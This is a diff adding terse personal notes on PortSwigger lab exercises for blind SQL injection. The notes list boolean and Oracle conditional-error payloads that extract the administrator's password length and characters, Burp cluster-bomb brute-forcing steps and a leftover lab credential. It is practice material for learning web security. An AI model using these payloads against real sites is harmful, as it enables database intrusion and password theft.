@@ -125,3 +125,35 @@ portgresql(burp_suite)
 -- administrator~dwd1ynj7pn2ibps3mf3v
 ```
 [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+```sql
+' and '1'='1--true
+' and '1'='2--false
+
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 1--
+...
+' AND (SELECT SUBSTRING(password,21,1) FROM users WHERE username='administrator')='$a$'---
+--(burp
+cluster bomb attack --->payloads ...
+)
+...
+```
+[Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+```sql
+#oracle
+login
+TrackingId -->invalid (abc)
+' ->E
+' AND 1=1 --true
+' AND 1=0 --true
+
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a' --login (' AND 'a' ='a' --)
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a' --error ->true
+' AND (SELECT CASE WHEN LENGTH(password) >19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ='a' --error ->true
+' AND (SELECT CASE WHEN LENGTH(password) >20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ='a' --login (LENGTH(password)=20)
+' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --
+
+' AND (SELECT CASE WHEN SUBSTR(password,$1$,1)='$4$' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --(burp)
+----------------------------------------------------------------------------------------
+' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual)='a' --login-->true
+```
+[Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
